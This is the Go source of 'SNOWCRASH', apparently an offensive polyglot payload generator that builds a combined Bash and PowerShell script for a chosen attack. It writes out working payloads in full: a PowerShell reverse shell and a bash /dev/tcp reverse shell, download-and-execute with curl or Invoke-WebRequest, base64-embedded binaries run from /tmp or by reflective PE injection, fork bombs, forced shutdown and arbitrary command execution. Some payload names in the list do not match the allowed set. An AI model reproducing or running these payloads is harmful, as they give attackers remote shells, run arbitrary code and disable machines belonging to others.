package main
import (
	"github.com/akamensky/argparse"
	"os"
	"fmt"
    "github.com/fatih/color"
	"github.com/olekukonko/tablewriter"
   	"github.com/chzyer/readline"
    "github.com/common-nighthawk/go-figure"
	"net"
	"io"
	"strings"
	"encoding/base64"
	"strconv"
	"bufio"
	"reflect"
	"math/rand"
	"github.com/gobuffalo/packr"
	"time"
)

func print_banner(){
    banner := figure.NewFigure("SNOWCRASH", "", true)
    color.Set(color.Bold)
    banner.Print()
    color.Unset()
	fmt.Println("")
	fmt.Println(cyan("\t -- A polyglot payload generator --"))
    fmt.Println("")
}

func list(){
	actions_data := [][]string{
        []string{"reverse_shell", "Spawn a reverse shell"},
        []string{"cmd_exec", "Execute a command"},
		[]string{"forkbomb", "Run a forkbomb"},
		[]string{"memexec", "Embed and execute a binary"},
		[]string{"download_exec", "Download and execute a file"},
		[]string{"shutdown", "Shutdown computer"},
        []string{"custom", "Use custom Bash and Powershell scripts"},
    }
	actions_table := tablewriter.NewWriter(os.Stdout)
	actions_table.SetAutoWrapText(false)
	actions_table.SetHeader([]string{"NAME", "DESCRIPTION"})
    actions_table.SetColumnColor(
        tablewriter.Colors{tablewriter.FgGreenColor},
        tablewriter.Colors{}, 
    )
	for v := range actions_data {
		actions_table.Append(actions_data[v])
	}
	fmt.Println("")
	fmt.Println("[*] Payloads: ")
    actions_table.Render()
    fmt.Println("")
}

var red = color.New(color.FgRed).SprintFunc()
var green = color.New(color.FgGreen).SprintFunc()
var cyan = color.New(color.FgBlue).SprintFunc()
var bold = color.New(color.Bold).SprintFunc()

func print_good(msg string){
   fmt.Printf("%s %s", green("[+]"), msg)
}

func print_info(msg string){
    fmt.Println("[*]", msg)
}

func print_error(msg string){
    fmt.Printf("%s %s", red("[x]"), msg)
}

func print_header(message string){
    color.Set(color.Bold)
    fmt.Printf("-- %s --", message)
    color.Unset()
    fmt.Println("")
}

func contains(s interface{}, elem interface{}) bool {
    arrV := reflect.ValueOf(s)
	if arrV.Kind() == reflect.Slice {
        for i := 0; i < arrV.Len(); i++ {
            if arrV.Index(i).Interface() == elem {
                return true
            }
        }
    }
	return false
}

func str_to_int(string_integer string) int {
	//i, _ := strconv.ParseInt(string_integer, 10, 32)
	i, _ := strconv.Atoi(string_integer)
	return i
}

func interval_to_seconds(interval string) int64{ 
    period_letter := string(interval[len(interval)-1])
    intr := string(interval[:len(interval)-1]) //Check this
    i, _ := strconv.ParseInt(intr, 10, 64) 
    switch period_letter{
        case "s":
            return i
        case "m":
            return i*60
        case "h":
            return i*3600
    }
    return i
}

func input(name string, message string, default_value string) string{
    if default_value == ""{
        default_value = "none"
    }
    final_prompt := fmt.Sprintf("%s %s (default: %s): ", red(name), message, default_value)
    p, _ := readline.NewEx(&readline.Config{
        Prompt:              final_prompt,
        InterruptPrompt:     "^C",
    })
    line, _ := p.Readline()
    if (len(line) == 0 || contains([]string{"y", "yes"}, line)){
        return default_value
    } else {
        return line
    }
}

func write_to_file(filename string, data string) error {
    file, err := os.Create(filename)
    exit_on_error("[FILE CREATION ERROR]", err)
    defer file.Close()

    _, err = io.WriteString(file, data)
    exit_on_error("[FILE WRITE ERROR]", err)
    return file.Sync()
}

func read_file(filename string) string { 
	contents := ""
	file, err := os.Open(filename)
	exit_on_error("{FILE READ ERROR}", err)
	defer file.Close()
	scanner := bufio.NewScanner(file)
	for scanner.Scan(){
		contents += scanner.Text()
	}
	return contents
}

func exit_on_error(message string, err error){
    if err != nil{
        fmt.Printf("%s %v", red(message+":"), err)
        os.Exit(0)
    }
}

func base64_decode(str string) string {
	raw, _ := base64.StdEncoding.DecodeString(str)
	return fmt.Sprintf("%s", raw)
}

func base64_encode(str string) string {
	return base64.StdEncoding.EncodeToString([]byte(str))
}

func get_template(template_name string) string{ 
    template, err := packr.NewBox("./").FindString(template_name)
    exit_on_error("[PACKR ERROR]", err)
    return template
}

func get_local_ip() string {
    conn, _ := net.Dial("udp", "8.8.8.8:80")
    defer conn.Close()
    ip := conn.LocalAddr().(*net.UDPAddr).IP
    return fmt.Sprintf("%d.%d.%d.%d", ip[0], ip[1], ip[2], ip[3])
}

func random_string(n int) string{
    rand.Seed(time.Now().UnixNano())
    var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
    b := make([]rune, n)
    for i := range b {
        b[i] = letters[rand.Intn(len(letters))]
    }
    return string(b)
}

func generate_payload(payload_name string, sleep_interval string, 
					out string, stdout bool){
	available_payloads := []string{"cmd_exec", "reverse_shell", "custom", 
									"exfiltrate", "memexec"}
    if (! contains(available_payloads, payload_name)){
        print_error("No such payload: "+payload_name)
        os.Exit(0)
    }

	polyglot_template := get_template("templates/polyglot_template")
	polyglot_template = strings.Replace(polyglot_template, "SLEEP_INTERVAL", fmt.Sprintf("%d", interval_to_seconds(sleep_interval)), -1)

	powershell := ""
	bash := ""

	print_header("PAYLOAD CUSTOMIZATION")
	switch payload_name{
	case "reverse_shell":
		powershell = `$client = New-Object System.Net.Sockets.TCPClient("HOST", PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
`
		bash = `bash -i >& /dev/tcp/HOST/PORT 0>&1`

		host := input("[RHOST]", "Host to connect to", get_local_ip())
		port := input("[RPORT]", "Port to connect to", "4444")
		bash = strings.Replace(bash, "HOST", host, -1)
		bash = strings.Replace(bash, "PORT", port, -1)
		powershell = strings.Replace(powershell, "HOST", host, -1)
		powershell = strings.Replace(powershell, "PORT", port, -1)
	case "cmd_exec":
		powershell = `iex COMMAND`
		bash = `COMMAND`

		command := input("[COMMAND]", "Command to execute", "")
		bash = strings.Replace(bash, "COMMAND", command, -1)
		powershell = strings.Replace(powershell, "COMMAND", command, -1)
	case "memexec": 
		elf_file_name := input("[LINUX BINARY]", "Binary to embed end execute on Linux machine", "")
		elf_args := input("[ELF BINARY ARGS]", "Arguments to pass to the Linux binary", "")
		exe_file_name := input("[WINDOWS BINARY]", "Binary to embed end execute on Windows machine", "")
		exe_args := input("[WINDOWS BINARY ARGS]", "Arguments to pass to the Windows binary", "")
		encoded_elf_file := base64_encode(read_file(elf_file_name))
		encoded_exe_file := base64_encode(read_file(exe_file_name))
		tmp := random_string(4)
		bash = fmt.Sprintf(`
			echo "%s"|base64 -d| > /tmp/%s; chmod +x /tmp/%s; /tmp/./%s %s 		
		`, encoded_elf_file, tmp, tmp, tmp, elf_args)
		powershell = fmt.Sprintf(`
			$EncodedFile = "%s" 
			%s
			$DecodedFileByteArray = [System.Convert]::FromBase64String($EncodedFile)
			Invoke-ReflectivePEInjection -PEBytes $DecodedFileByteArray -ExeArgs %s
		`, encoded_exe_file, get_template("templates/pe_inject"), exe_args)

	case "custom":
		powershell_script := input("[POWERSHELL SCRIPT]", "Path to the powershell script", "")
		bash_script := input("[BASH SCRIPT]", "Path to the bash script", "")
		powershell = read_file(powershell_script)
		bash = read_file(bash_script)
	case "forkbomb":
		powershell = `Do {
    		start powershell -windowstyle hidden { start-process powershell.exe -WindowStyle hidden
			}
			}
			Until ($x -eq $true)`
		bash = `:(){:|: &};:`
		print_info("This payload has no options")
	case "download_exec":
		url := input("[URL]", "URL address of the file to download", "")
		tmp := random_string(4)
		bash = fmt.Sprintf(`
			curl %s > %s; chmod +x %s; ./%s
			`, url, tmp, tmp)
		powershell = fmt.Sprintf(`
			$url = %s
			$out = %s
			Invoke-WebRequest -Uri $url -OutFile $out
			Start-Process -Filepath "$out"
		`, url, tmp+".exe")
	case "shutdown":
		powershell = `Stop-Computer -ComputerName localhost`
		bash = `shutdown`
		print_info("This payload has no options")

	}

	polyglot_template = strings.Replace(polyglot_template, "X_POWERSHELL_SCRIPT_X", powershell, -1)
	polyglot_template = strings.Replace(polyglot_template, "X_BASH_SCRIPT_X", bash, -1)

	if ! stdout{
		write_to_file(out, polyglot_template)
		fmt.Println("")
		print_good("Saved generated payload in file: "+ bold(out))
	} else {
		fmt.Println(polyglot_template)
	}

}

func main(){
	print_banner()
    parser := argparse.NewParser("snowcrash", "")
    var OUT *string = parser.String("o", "out", &argparse.Options{Required: false, Default: "polyglot_script", Help: "Name of the generated polyglot file"})
    var LIST *bool = parser.Flag("l", "list", &argparse.Options{Required: false, Help: "List available payloads"})
	var PAYLOAD *string = parser.String("p", "payload", &argparse.Options{Required: false, Help: "Name of the payload to use"})
	var SLEEP *string = parser.String("s", "sleep", &argparse.Options{Required: false, Default: "0s", Help: "Sleep given interval before executing the payload"})
	var STDOUT *bool = parser.Flag("", "stdout", &argparse.Options{Required: false, Help: "Print payload to STDOUT instead of writing to file"})
	_ = OUT
	_ = LIST
	_ = PAYLOAD


	commandline_args := os.Args
	err := parser.Parse(commandline_args)
    exit_on_error("[PARSER ERROR]", err)

    if (*LIST){
        list()
        os.Exit(0)
    }
	generate_payload(*PAYLOAD, *SLEEP, *OUT, *STDOUT)

}
